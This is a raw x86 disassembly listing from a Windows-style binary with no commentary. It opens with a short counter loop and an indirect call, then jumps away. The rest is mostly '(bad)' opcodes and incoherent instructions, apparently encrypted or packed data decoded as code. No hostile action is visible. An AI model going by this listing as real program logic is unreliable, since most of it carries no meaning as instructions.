  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42a9eb
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	ss out 0x7a,al
  40623d:	push   0xb
  40623f:	cmp    eax,0x60f18383
  406244:	add    DWORD PTR [ebx+0x2c7519],0xffffffd2
  40624b:	sub    DWORD PTR [ecx+eax*2],ecx
  40624e:	mov    ch,0xe8
  406250:	int    0x38
  406252:	or     bl,BYTE PTR [ecx]
  406254:	xlat   BYTE PTR ds:[ebx]
  406255:	pusha  
  406256:	mov    cl,0xb2
  406258:	mov    esi,DWORD PTR [edx-0x76]
  40625b:	cmp    edi,DWORD PTR [edx-0x63]
  40625e:	call   0x25281eb
  406263:	into   
  406264:	push   esi
  406265:	pop    ds
  406266:	dec    eax
  406267:	stos   BYTE PTR es:[edi],al
  406268:	and    edi,DWORD PTR [ebx-0x3677925c]
  40626e:	jno    0x40623a
  406270:	push   esp
  406271:	mov    esp,ebx
  406273:	dec    ebp
  406274:	mov    dh,0x8
  406276:	push   cs
  406277:	sub    eax,0xe2f548f6
  40627c:	(bad)  
  40627e:	add    dl,ah
  406280:	pop    edi
  406281:	retf   0xaef1
  406284:	gs clc 
  406286:	jmp    0xbca2e2e3
  40628b:	lds    ebx,FWORD PTR [eax]
  40628d:	add    DWORD PTR [ecx+0x54],ebp
  406290:	push   eax
  406291:	mov    DWORD PTR [edi-0x30],ecx
  406294:	ins    BYTE PTR es:[edi],dx
  406295:	push   ds
  406296:	pop    edi
  406297:	out    0xdc,eax
  406299:	mov    dl,0x92
  40629b:	jmp    0x4062ab
  40629d:	push   eax
  40629e:	inc    edx
  40629f:	jle    0x40627e
  4062a1:	(bad)  
  4062a2:	aam    0x5
  4062a4:	(bad)  
  4062a5:	pop    ecx
  4062a6:	(bad)  
  4062a7:	mov    ah,0x9d
  4062a9:	xchg   ebp,eax
  4062aa:	outs   dx,BYTE PTR ds:[esi]
  4062ab:	cdq    
  4062ac:	xchg   esi,eax
  4062ad:	fwait
  4062ae:	sahf   
  4062af:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062b1:	jo     0x40625e
  4062b3:	add    al,BYTE PTR [edi]
  4062b5:	fild   WORD PTR [esi-0x6]
  4062b8:	adc    DWORD PTR [ecx-0x75],ebx
  4062bb:	ins    DWORD PTR es:[edi],dx
  4062bc:	mov    bl,BYTE PTR [eax]
  4062be:	dec    edi
  4062bf:	cwde   
  4062c0:	xchg   esp,eax
  4062c1:	mov    WORD PTR [esp+edi*1],?
  4062c4:	arpl   WORD PTR [esi],sp
  4062c6:	inc    DWORD PTR [ecx+edx*4+0x7a]
  4062ca:	imul   ebp,DWORD PTR [esi-0x68ec357c],0x70248017
  4062d4:	scas   eax,DWORD PTR es:[edi]
  4062d5:	addr16 mov dl,0xfb
  4062d8:	xchg   dh,dh
  4062da:	adc    eax,0x91b85e8e
  4062df:	push   edi
  4062e0:	add    dl,0x61
  4062e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062e4:	sti    
  4062e5:	ret    0x2c0f
  4062e8:	fiadd  DWORD PTR [edi]
  4062ea:	mov    eax,gs:0xf2aacc16
  4062f0:	xchg   edx,eax
  4062f1:	into   
  4062f2:	mov    ds:0x5b8c1364,eax
  4062f7:	ret    0x9479
  4062fa:	or     BYTE PTR [ecx-0x7b],ah
  4062fd:	mov    ebp,0x4bf2c433
  406302:	push   edi
  406303:	(bad)  
  406304:	mov    dh,0xf7
  406306:	jbe    0x4062c0
  406308:	fcomp  st(7)
  40630a:	cmc    
  40630b:	ins    DWORD PTR es:[edi],dx
  40630c:	jmp    0xe9f0dce7
  406311:	jo     0x406306
  406313:	jne    0x4062bc
  406315:	(bad)  
  406316:	std    
  406317:	(bad)
  40631b:	loopne 0x406300
  40631d:	sub    BYTE PTR [edx+0xfa374b0],bl
  406323:	cli    
  406324:	sbb    eax,0x420bdcf3
  406329:	mov    ds:0xee1efda6,al
  40632e:	and    bh,cl
  406330:	push   0x21
  406332:	sbb    ebx,DWORD PTR [edi-0x3c]
  406335:	cld    
  406336:	inc    edx
  406337:	ds (bad) 
  406339:	cmp    ebp,DWORD PTR [ecx]
  40633b:	xor    ah,bh
  40633d:	arpl   dx,bp
  40633f:	push   ebp
  406340:	adc    edi,DWORD PTR ds:0x978df227
  406346:	mul    BYTE PTR ds:0xf221f09e
  40634c:	and    BYTE PTR [edi+0x2e],dl
  40634f:	in     al,dx
  406350:	pusha  
  406351:	cli    
  406352:	xor    ebx,DWORD PTR [ebp-0x504c5ebc]
  406358:	jge    0x406341
  40635a:	push   es
  40635b:	lock test al,0x1b
  40635e:	(bad)  
  40635f:	xor    bl,BYTE PTR [eax+ebx*8-0x7a]
  406363:	mov    dh,0xd4
  406365:	loop   0x4062f2
  406367:	push   ebp
  406368:	cld    
  406369:	add    eax,0x6d0c83ef
  40636e:	jae    0x406372
  406370:	in     al,dx
  406371:	adc    eax,DWORD PTR [ecx-0x4d]
  406374:	adc    BYTE PTR [ecx],ch
  406376:	xchg   ebx,eax
  406377:	inc    ecx
  406378:	repz shl DWORD PTR [edi],cl
  40637b:	push   ebp
  40637c:	test   cl,dh
  40637e:	rcl    BYTE PTR [ebx],0x80
  406381:	pop    edi
  406382:	xchg   DWORD PTR [esi],edx
  406384:	push   edi
  406385:	adc    dl,BYTE PTR [eax]
  406387:	loopne 0x406373
  406389:	daa    
  40638a:	mov    ecx,0xc212f87
  40638f:	retf   
  406390:	adc    BYTE PTR [ebp-0x7238f915],cl
  406396:	fwait
  406397:	idiv   eax
  406399:	mov    eax,0x36421302
  40639e:	das    
  40639f:	sar    DWORD PTR [ebx+eiz*8+0x49],cl
  4063a3:	mov    eax,0x328f3b87
  4063a8:	sub    al,BYTE PTR [edi]
  4063aa:	jo     0x406421
  4063ac:	dec    ecx
  4063ad:	push   0x8d781f75
  4063b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063b3:	cmp    DWORD PTR [ebx],ebx
  4063b5:	xor    esi,ebp
  4063b7:	lds    ebp,FWORD PTR [ebx+edx*4+0x0]
  4063bb:	dec    ebx
  4063bc:	shr    DWORD PTR [edi],0x41
  4063bf:	pop    edx
  4063c0:	shl    DWORD PTR [esi-0x19],0x79
  4063c4:	push   ds
  4063c5:	div    ah
  4063c7:	mov    edx,0x7b577ba0
  4063cc:	sar    BYTE PTR [ecx-0x69e137e],0x28
  4063d3:	icebp  
  4063d4:	pop    ss
  4063d5:	pop    eax
  4063d6:	push   ebp
  4063d7:	retf   
  4063d8:	adc    bh,cl
  4063da:	test   eax,0xd2045592
  4063df:	sbb    eax,0x8908ca50
  4063e4:	dec    edi
  4063e5:	sar    DWORD PTR [ecx],0xfd
  4063e8:	dec    ebp
  4063e9:	(bad)  
  4063ea:	daa    
  4063eb:	pop    ebx
  4063ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ed:	pop    ebp
  4063ee:	xchg   edx,eax
  4063ef:	sbb    DWORD PTR [edx-0x753c2277],eax
  4063f5:	add    al,0xf5
  4063f7:	adc    DWORD PTR [ecx-0x3ba81da1],esp
  4063fd:	and    BYTE PTR [edx-0xd446e13],al
  406403:	aaa    
  406404:	mov    dl,0x98
  406406:	dec    eax
  406407:	pop    ebp
  406408:	and    bh,BYTE PTR [ecx+esi*4]
  40640b:	sub    esp,esp
  40640d:	jae    0x406435
  40640f:	test   al,0x18
  406411:	adc    edx,DWORD PTR [edx+esi*1-0x2e]
  406415:	cmp    dl,dl
  406417:	stos   BYTE PTR es:[edi],al
  406418:	jmp    0x406402
  40641a:	bound  eax,QWORD PTR [ebx]
  40641c:	pop    ss
  40641d:	jp     0x4063bf
  40641f:	mov    al,0x7a
  406421:	out    0xf5,eax
  406423:	lods   eax,DWORD PTR ds:[esi]
  406424:	pushf  
  406425:	scas   al,BYTE PTR es:[edi]
  406426:	dec    esp
  406427:	jge    0x4063b5
  406429:	sub    edi,esp
  40642b:	enter  0x8168,0xd0
  40642f:	stos   DWORD PTR es:[edi],eax
  406430:	cmp    BYTE PTR [ecx-0x2be85a88],ah
  406436:	jmp    0x406450
  406438:	push   ebp
  406439:	jge    0x406488
  40643b:	fcomp  st(2)
  40643d:	pop    ss
  40643e:	cmp    DWORD PTR [ebp+0x43],esi
  406441:	repnz stc 
  406443:	sbb    BYTE PTR [esi+ecx*4],dh
  406446:	popa   
  406447:	push   edx
  406448:	add    ebp,edx
  40644a:	ss push cs
  40644c:	loopne 0x406421
  40644e:	lods   eax,DWORD PTR ds:[esi]
  40644f:	int    0xff
  406451:	add    edx,DWORD PTR [esp+ebx*1+0x22]
  406455:	mul    ecx
  406457:	hlt    
  406458:	xchg   esi,eax
  406459:	xor    cl,ch
  40645b:	mov    cl,al
  40645d:	shl    DWORD PTR [edi+0x30],1
  406460:	leave  
  406461:	sahf   
  406462:	xor    ecx,DWORD PTR [esi+0x5]
  406465:	leave  
  406466:	cld    
  406467:	ds in  al,dx
  406469:	(bad)  
  40646a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40646c:	je     0x40643e
  40646e:	mov    eax,0x96c4795d
  406473:	jge    0x40648d
  406475:	cmp    al,0x98
  406477:	jp     0x40647d
  406479:	xor    dl,BYTE PTR [edi]
  40647b:	lock xchg esi,eax
  40647d:	sbb    DWORD PTR [esi],esp
  40647f:	test   al,0x2f
  406482:	jbe    0x40640b
  406484:	aas    
  406485:	sbb    BYTE PTR [edi-0x7c556b67],bl
  40648b:	icebp  
  40648c:	cmp    ebp,edx
  40648e:	in     eax,dx
  40648f:	test   DWORD PTR [ecx],esi
  406491:	loopne 0x40642c
  406493:	test   ebp,edi
  406495:	xchg   ebx,eax
  406496:	ret    0xf8f4
  406499:	mov    edi,0x11c9733e
  40649e:	in     eax,dx
  40649f:	fs out dx,al
  4064a1:	sbb    dl,BYTE PTR [edx+0x6a]
  4064a4:	or     eax,0x29b7dc5f
  4064a9:	dec    ecx
  4064aa:	jmp    0x5cc9d421
  4064af:	and    edx,DWORD PTR [edx-0x4e563e79]
  4064b5:	xor    al,0xd7
  4064b7:	xchg   ebx,eax
  4064b8:	mov    DWORD PTR [edi],eax
  4064ba:	in     eax,0xf
  4064bc:	cld    
  4064bd:	mov    ecx,0xeb03a6e8
  4064c2:	xor    edx,DWORD PTR [edi-0x21]
  4064c5:	and    cl,ch
  4064c7:	mov    bh,BYTE PTR [esi+0x4f]
  4064ca:	jno    0x40650b
  4064cc:	or     eax,0xb0c77a61
  4064d1:	xchg   DWORD PTR [ecx],ecx
  4064d3:	pop    es
  4064d4:	and    edi,ebp
  4064d6:	imul   edx,edx,0x8965c864
  4064dc:	rol    BYTE PTR [esp+eax*1],1
  4064df:	or     DWORD PTR [eax],ebx
  4064e1:	mov    edx,0x8726adab
  4064e6:	out    0x2e,eax
  4064e8:	repnz lock out 0x63,al
  4064ec:	cwde   
  4064ed:	test   BYTE PTR [ecx],0xd2
  4064f0:	push   esi
  4064f1:	jp     0x40651b
  4064f3:	loopne 0x4064b8
  4064f5:	cmp    edx,DWORD PTR [edi+ebp*8]
  4064f8:	add    cl,dl
  4064fa:	jle    0x4064fd
  4064fc:	mov    WORD PTR [edi-0x42],gs
  4064ff:	jno    0x406482
  406501:	inc    ebx
  406502:	out    0xcf,eax
  406504:	xchg   edi,eax
  406505:	push   0x4cd82e8
  40650a:	cmp    DWORD PTR [eax-0x53],esi
  40650d:	cmp    al,0x31
  40650f:	mov    edi,0x2df4fd34
  406514:	loope  0x40656d
  406516:	jnp    0x406559
  406518:	xchg   esp,eax
  406519:	lods   eax,DWORD PTR ds:[esi]
  40651a:	in     eax,0x9c
  40651c:	loopne 0x406597
  40651e:	cdq    
  40651f:	push   edx
  406520:	ds cwde 
  406522:	adc    BYTE PTR [eax-0x5b12c799],bh
  406528:	rol    DWORD PTR ds:0x9795b2d4,1
  40652e:	jecxz  0x4065ac
  406530:	push   ds
  406531:	push   eax
  406533:	aad    0xa8
  406535:	sbb    dh,BYTE PTR [ebx]
  406537:	scas   eax,DWORD PTR es:[edi]
  406538:	or     eax,0x1d4b0be0
  40653d:	cmp    ah,BYTE PTR [esi-0x75]
  406540:	fmulp  st(1),st
  406542:	xor    dh,0xfe
  406545:	retf   
  406546:	push   edx
  406547:	inc    esp
  406548:	jno    0x4064f7
  40654a:	out    0x43,eax
  40654c:	js     0x4065a1
  40654e:	push   ebp
  40654f:	gs mov eax,0x2c9615
  406555:	stos   BYTE PTR es:[edi],al
  406556:	fisubr DWORD PTR [ecx+0x4a]
  406559:	cmc    
  40655a:	sti    
  40655b:	cmp    BYTE PTR [eax+edx*4-0x177445fc],ch
  406562:	inc    ebp
  406563:	or     edx,DWORD PTR [ebx-0x1]
  406566:	sahf   
  406567:	push   ebx
  406568:	rcl    DWORD PTR [edx+edi*8],0xe3
  40656c:	xchg   ebp,eax
  40656d:	aaa    
  40656e:	inc    ebx
  40656f:	push   edx
  406570:	add    BYTE PTR [edx+0x2ee418fb],0x3e
  406577:	into   
  406578:	cmc    
  406579:	inc    ecx
  40657a:	sub    edx,ecx
  40657c:	mov    eax,ds:0x82d764b2
  406581:	retf   
  406582:	loop   0x406570
  406584:	inc    ecx
  406585:	rol    DWORD PTR [edx+0x2],0x48
  406589:	mov    esi,0xc46f2dd3
  40658e:	add    BYTE PTR [esp+ecx*4-0x5fdebcc2],bh
  406595:	jbe    0x4065c5
  406597:	fmul   QWORD PTR [ecx+0x44]
  40659a:	(bad)  
  40659b:	lock pop edi
  40659d:	push   edi
  40659e:	je     0x406610
  4065a0:	rcl    dh,1
  4065a2:	(bad)  
  4065a3:	xchg   ebx,eax
  4065a4:	shl    edx,cl
  4065a6:	push   edx
  4065a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a8:	xor    ch,ch
  4065aa:	xor    BYTE PTR [edx+0x77c58a50],bl
  4065b0:	cld    
  4065b1:	cmp    BYTE PTR [eax+0x5c4f921b],ch
  4065b7:	div    DWORD PTR [edi-0x5f]
  4065ba:	pop    edi
  4065bb:	cmc    
  4065bc:	cmp    al,0x2f
  4065be:	ins    BYTE PTR es:[edi],dx
  4065bf:	push   0x5b
  4065c1:	in     eax,0x45
  4065c3:	mov    ds:0x456245,al
  4065c8:	sahf   
  4065c9:	adc    BYTE PTR [edi+0x54764f60],0xdb
  4065d0:	dec    DWORD PTR [ecx*4+0x4ddbb516]
  4065d7:	cli    
  4065d8:	fist   DWORD PTR [eax]
  4065da:	je     0x40657f
  4065dc:	mov    DWORD PTR [edx-0x2883d27],edi
  4065e2:	js     0x406616
  4065e4:	call   0x38e8:0x5adf6b61
  4065eb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ed:	jmp    0x6e3583a8
  4065f2:	sub    eax,0x31a8d4b3
  4065f7:	sbb    eax,0xeaaca827
  4065fc:	ds dec edx
  4065fe:	push   esi
  4065ff:	popa   
  406600:	push   edx
  406601:	push   ss
  406602:	mov    esp,0xb8715010
  406607:	add    al,0x8c
  406609:	adc    DWORD PTR [ebx+0x6b],0x85b54c69
  406610:	push   cs
  406611:	sti    
  406612:	lock fwait
  406614:	daa    
  406615:	sbb    ah,BYTE PTR ds:0xac08c864
  40661b:	sbb    eax,0x6146daf0
  406620:	pop    ds
  406621:	adc    bh,BYTE PTR [edi+edi*2-0x5f]
  406625:	jp     0x4065d3
  406627:	sbb    eax,0xfd2593de
  40662c:	mov    esi,0xce11f6dd
  406631:	xor    al,ah
  406633:	jmp    0x4065bc
  406635:	(bad)  
  406637:	jle    0x40662b
  406639:	mov    bl,BYTE PTR [ecx-0x62]
  40663c:	cs int 0x6c
  40663f:	fld    TBYTE PTR [ebp+0x2a853f18]
  406645:	js     0x4065d7
  406647:	mov    dh,0xea
  406649:	push   edx
  40664a:	rol    DWORD PTR cs:[edi+ebx*1+0x262cd097],cl
  406652:	pop    ss
  406653:	or     al,0xc4
  406655:	dec    ebx
  406656:	sbb    al,0x54
  406658:	bound  edi,QWORD PTR [ebx]
  40665a:	pop    ebx
  40665b:	call   0x1d1e:0xeeb60600
  406662:	std    
  406663:	adc    DWORD PTR [edx-0x3c620529],ebp
  406669:	sub    eax,DWORD PTR [eax-0x2877082]
  40666f:	pop    edx
  406670:	(bad)
  406675:	call   0x1900:0xabf90d25
  40667c:	cmp    al,0x7d
  40667e:	(bad)  
  40667f:	into   
  406680:	mov    es,WORD PTR [ebx+0x7758979a]
  406686:	test   al,0xd9
  406688:	pop    esp
  406689:	loopne 0x406635
  40668b:	loop   0x406639
  40668d:	int    0x8d
  40668f:	(bad)  
  406690:	jbe    0x406708
  406692:	fwait
  406693:	adc    al,0xa1
  406695:	mov    bh,0xbd
  406697:	arpl   WORD PTR [ebp-0x22],cx
  40669a:	call   0xbee27bbe
  40669f:	aam    0xdb
  4066a1:	bound  edi,QWORD PTR [ebx]
  4066a3:	pop    ebp
  4066a4:	pushf  
  4066a5:	push   edx
  4066a6:	inc    ebx
  4066a7:	jno    0x4066c4
  4066a9:	mov    bh,0xa0
  4066ab:	xchg   ebp,eax
  4066ac:	repnz retf 
  4066ae:	pop    edx
  4066af:	adc    eax,0xd609ce1a
  4066b4:	and    eax,0x3a635df9
  4066b9:	sbb    DWORD PTR [esp+esi*2],ecx
  4066bc:	les    ebx,FWORD PTR [ebp-0x61]
  4066bf:	xchg   DWORD PTR [edi+0x27],esp
  4066c2:	mov    cs,edi
  4066c4:	rcl    BYTE PTR [eax+0x6b6c185b],1
  4066ca:	ds xor eax,0x2669bd14
  4066d0:	sar    DWORD PTR [edx],cl
  4066d2:	mov    ebp,0x5008d460
  4066d7:	or     eax,0x97d67d28
  4066dc:	dec    ecx
  4066dd:	das    
  4066de:	dec    ebp
  4066df:	xchg   edx,eax
  4066e0:	xchg   ebx,eax
  4066e1:	sti    
  4066e2:	es in  eax,dx
  4066e4:	jle    0x406726
  4066e6:	cs js  0x40671d
  4066e9:	xor    DWORD PTR [eax],eax
  4066eb:	add    eax,DWORD PTR [ebx-0x54daa4cc]
  4066f1:	lods   al,BYTE PTR ds:[esi]
  4066f2:	pop    esi
  4066f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f4:	xor    ecx,DWORD PTR gs:[edi]
  4066f7:	push   edi
  4066f8:	rcr    BYTE PTR [ebx-0xc4d0921],0xc2
  4066ff:	mov    ebx,0x9e7a7f17
  406704:	pop    eax
  406705:	mov    esp,0xd8587f43
  40670a:	std    
  40670b:	dec    eax
  40670c:	add    DWORD PTR [edx],ebx
  40670e:	xchg   edx,eax
  40670f:	lds    esp,FWORD PTR [edi+0x2efb5b35]
  406715:	(bad)  
  406716:	dec    ebx
  406717:	jle    0x406762
  406719:	sub    DWORD PTR [ebp-0x1cf5519e],esp
  40671f:	push   ds
  406720:	(bad)  
  406721:	cmp    bh,dh
  406723:	ja     0x406720
  406725:	sahf   
  406726:	(bad)  
  406727:	cmp    BYTE PTR [ebx+0x205f5370],bl
  40672d:	mov    ds:0x69ed34bc,eax
  406732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406733:	mov    eax,ds:0x5f0a9df1
  406738:	xlat   BYTE PTR ds:[ebx]
  406739:	mov    esp,0x81f36682
  40673e:	xchg   edi,eax
  40673f:	pop    ds
  406740:	daa    
  406741:	repz jns 0x4066ca
  406744:	dec    ebx
  406745:	and    dl,BYTE PTR [ebx]
  406747:	jbe    0x406707
  406749:	shl    DWORD PTR [esi],0xc3
  40674c:	jl     0x4067a4
  40674e:	cwde   
  40674f:	call   0x4c02:0x598ea8a0
  406756:	ins    DWORD PTR es:[edi],dx
  406757:	das    
  406758:	ds push ecx
  40675a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675b:	push   eax
  40675c:	fisttp QWORD PTR [ebp+0x5]
  40675f:	cdq    
  406760:	in     eax,0x3c
  406762:	mov    BYTE PTR [edi+0x19],bl
  406765:	out    0x7c,al
  406767:	mov    esi,esp
  406769:	add    cl,BYTE PTR [eax]
  40676b:	fisub  WORD PTR [ecx-0x4ce4f7c3]
  406771:	in     eax,0x50
  406773:	(bad)  
  406775:	xchg   esi,eax
  406776:	jno    0x4067a9
  406778:	dec    ebx
  406779:	cmp    ah,0xe
  40677c:	call   0x2f674723
  406781:	dec    eax
  406782:	leave  
  406783:	int    0x6e
  406785:	inc    ecx
  406786:	jno    0x4067b1
  406788:	je     0x406723
  40678a:	sbb    eax,0xcd136035
  40678f:	dec    ebp
  406790:	jmp    0x3cb7:0x1085a278
  406797:	lea    ecx,[ecx-0x41]
  40679a:	(bad)  
  40679c:	inc    esi
  40679d:	sbb    DWORD PTR [eax-0x6a64aaab],ecx
  4067a3:	(bad)  
  4067a4:	ins    DWORD PTR es:[edi],dx
  4067a5:	adc    DWORD PTR [eax+0x7fb14b89],esi
  4067ab:	push   edi
  4067ac:	pop    esp
  4067ad:	sar    BYTE PTR [esi+0x0],0x97
  4067b1:	aad    0x9c
  4067b3:	adc    edi,edi
  4067b5:	cmp    BYTE PTR [eax+0x7445d7a4],bh
  4067bb:	adc    esi,ebp
  4067bd:	imul   edx,DWORD PTR [ecx+0x1d4609c6],0x3c
  4067c4:	pusha  
  4067c5:	xchg   esp,eax
  4067c6:	repnz push edx
  4067c8:	mov    ecx,0xbd7e614a
  4067cd:	xchg   BYTE PTR [ebx+ebp*1-0x6a],al
  4067d1:	aaa    
  4067d2:	dec    edx
  4067d3:	mov    DWORD PTR [edx],edx
  4067d5:	add    BYTE PTR [edi-0x27699320],cl
  4067db:	pop    ebp
  4067dc:	push   cs
  4067dd:	cld    
  4067de:	stos   BYTE PTR es:[edi],al
  4067df:	cmp    BYTE PTR [ebx+0x4e],al
  4067e2:	pop    ds
  4067e3:	imul   esp,DWORD PTR [edx-0x4b688eaf],0x2c77a818
  4067ed:	pop    edx
  4067ee:	inc    edx
  4067ef:	mov    ebx,0x83c7f8fd
  4067f4:	jne    0x40677a
  4067f6:	push   0x12
  4067f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067f9:	add    eax,0xb29de8dc
  4067fe:	dec    ecx
  4067ff:	push   es
  406800:	lea    ecx,[edx]
  406802:	push   ebx
  406803:	loope  0x4067b2
  406805:	ret    0xaa51
  406808:	repz out 0xc3,al
  40680b:	jns    0x406820
  40680d:	cwde   
  40680e:	(bad)  
  40680f:	cmp    BYTE PTR [si],cl
  406812:	dec    ebx
  406813:	push   ebx
  406814:	xchg   esp,eax
  406815:	dec    esp
  406816:	mov    ds:0x988b9858,al
  40681b:	add    BYTE PTR [ebx+0x5b2a85],ah
  406821:	pop    ebx
  406822:	add    ecx,DWORD PTR [eax+0x3a9f3a0a]
  406828:	mov    BYTE PTR ds:0xee372b7f,dh
  40682e:	test   DWORD PTR [ebp-0x3e],ebp
  406831:	mov    ecx,ebp
  406833:	shl    BYTE PTR [edx+ebx*4-0x695701a5],0x2d
  40683b:	std    
  40683c:	cmc    
  40683d:	mov    DWORD PTR [esp+ecx*1+0x1fbaa4d2],edx
  406844:	pop    ebp
  406845:	xchg   edi,eax
  406846:	cli    
  406847:	jns    0x4068ba
  406849:	sub    DWORD PTR [edx+0x4],edi
  40684c:	sbb    esi,edx
  40684e:	jmp    0x71fff558
  406853:	ds ins BYTE PTR es:[edi],dx
  406855:	mov    al,0xed
  406857:	cmc    
  406858:	xchg   ecx,eax
  406859:	inc    edi
  40685a:	pop    edx
  40685b:	xor    BYTE PTR [eax+0x1cfe8baf],0x9b
  406862:	mov    ah,0xc
  406864:	inc    ecx
  406865:	mov    ebp,0x71ec7d55
  40686a:	jae    0x406869
  40686c:	xor    BYTE PTR [esi+0x63],0x3c
  406870:	loope  0x4068c4
  406872:	(bad)  
  406873:	add    DWORD PTR [ebx+0x365e3190],edi
  406879:	xor    al,0xd
  40687b:	mov    eax,ds:0xfc551e9b
  406880:	out    0xb2,eax
  406882:	iret   
  406883:	adc    BYTE PTR [edx+ecx*2],0x53
  406887:	xor    al,0x99
  406889:	push   es
  40688a:	mov    ds:0xe97c23f2,eax
  40688f:	leave  
  406890:	or     edx,ebp
  406892:	sar    DWORD PTR [ebx],0x9c
  406895:	xchg   ebx,eax
  406896:	imul   esp,DWORD PTR [ebx+0x2a],0xffffff92
  40689a:	outs   dx,DWORD PTR ds:[esi]
  40689b:	pop    es
  40689c:	push   eax
  40689d:	adc    ebp,ebx
  40689f:	popa   
  4068a0:	jg     0x4068ce
  4068a2:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a4:	xor    ebx,DWORD PTR [eax+ecx*4-0x5a]
  4068a8:	mov    bl,0xa6
  4068aa:	out    0xc9,al
  4068ac:	pop    esp
  4068ad:	repnz std 
  4068af:	jmp    0x4ed6:0x12ca8204
  4068b6:	cmc    
  4068b7:	xor    al,dh
  4068b9:	sti    
  4068ba:	cmp    DWORD PTR [edi+0x5a80b03d],ebp
  4068c0:	enter  0x32ff,0xae
  4068c4:	sub    DWORD PTR [edx-0x70],esi
  4068c7:	adc    BYTE PTR ds:0xfcedfd54,ch
  4068cd:	cmc    
  4068ce:	inc    esi
  4068cf:	sbb    esi,esi
  4068d1:	in     al,0x39
  4068d3:	in     eax,0x91
  4068d5:	xor    BYTE PTR [esi+0x57867e33],ch
  4068db:	push   es
  4068dc:	xor    ebp,DWORD PTR [ecx+eiz*8+0x7f1c638f]
  4068e3:	sub    BYTE PTR [esi],al
  4068e5:	jle    0x4068fa
  4068e7:	mov    es,esi
  4068e9:	inc    esp
  4068ea:	dec    esi
  4068eb:	xchg   esp,eax
  4068ec:	mov    BYTE PTR [esi+edx*4+0x20],0x7e
  4068f1:	aad    0x44
  4068f3:	push   edx
  4068f4:	mov    esi,0x7fa646aa
  4068f9:	pushf  
  4068fa:	fs popf 
  4068fc:	push   esi
  4068fd:	cs clc 
  4068ff:	outs   dx,BYTE PTR ds:[esi]
  406900:	aam    0x94
  406902:	dec    edi
  406903:	lds    edi,FWORD PTR [ebp-0x7d5f70a2]
  406909:	mov    cl,0x8c
  40690b:	inc    esi
  40690c:	mov    edx,0xdb292676
  406911:	jp     0x40696c
  406913:	ret    
  406914:	out    0x3c,eax
  406916:	test   BYTE PTR [edi+0x6ce88868],ah
  40691c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40691d:	xchg   esp,eax
  40691e:	or     edx,DWORD PTR [ecx]
  406920:	cwde   
  406921:	out    dx,eax
  406922:	jecxz  0x406902
  406924:	mov    ah,0xa3
  406926:	push   es
  406927:	adc    DWORD PTR [esi-0xea70a5d],esp
  40692d:	inc    ecx
  40692e:	mov    eax,ds:0x49787edd
  406933:	fmul   st(3),st
  406935:	in     al,0xd7
  406937:	cmp    eax,0x9c995db1
  40693c:	or     BYTE PTR [ecx+edi*1+0x595a37d6],dl
  406943:	(bad)  
  406944:	ins    BYTE PTR es:[edi],dx
  406945:	cld    
  406946:	jmp    0x6fd6665e
  40694b:	imul   edi,edi,0x41
  40694e:	mov    dl,bh
  406950:	cmp    bh,BYTE PTR [esi+0x6d]
  406953:	or     al,0x63
  406955:	push   esp
  406956:	pop    ds
  406957:	data16 stc 
  406959:	pop    edx
  40695a:	sub    DWORD PTR [ebx-0x74],edi
  40695d:	mov    dl,0x9b
  40695f:	outs   dx,BYTE PTR ds:[esi]
  406960:	test   DWORD PTR [ebp-0x57],edx
  406963:	add    al,0x99
  406965:	lea    esi,[ebp+0x347fdca8]
  40696b:	fcmovne st,st(7)
  40696d:	mov    al,ds:0x2c44910c
  406972:	inc    esp
  406973:	(bad)  
  406975:	addr16 and eax,0xf90c54db
  40697b:	xor    ebp,DWORD PTR [ecx+0x29]
  40697e:	arpl   bp,ax
  406980:	push   esp
  406981:	(bad)  
  406982:	rcl    DWORD PTR [edi-0x52f55834],1
  406988:	xor    eax,esi
  40698a:	adc    bl,al
  40698c:	dec    edi
  40698d:	xchg   BYTE PTR [eax-0x3f],cl
  406990:	mov    esi,0x582979c0
  406995:	inc    edi
  406996:	scas   eax,DWORD PTR es:[edi]
  406997:	sbb    edi,eax
  406999:	daa    
  40699a:	adc    al,0xdc
  40699c:	add    DWORD PTR [eax-0x28674668],0x1
  4069a3:	cdq    
  4069a4:	daa    
  4069a5:	cli    
  4069a6:	cmp    DWORD PTR ds:[ebx+ebx*1],ebx
  4069aa:	add    eax,0x6c21a6ff
  4069af:	jmp    0x95ea488c
  4069b4:	out    dx,al
  4069b5:	sub    eax,0x3346429b
  4069ba:	cmc    
  4069bb:	stos   DWORD PTR es:[edi],eax
  4069bc:	imul   esp,ecx,0x66
  4069bf:	(bad)  
  4069c0:	lahf   
  4069c1:	adc    BYTE PTR [edi],0x92
  4069c4:	push   ecx
  4069c5:	push   0xc08b7f33
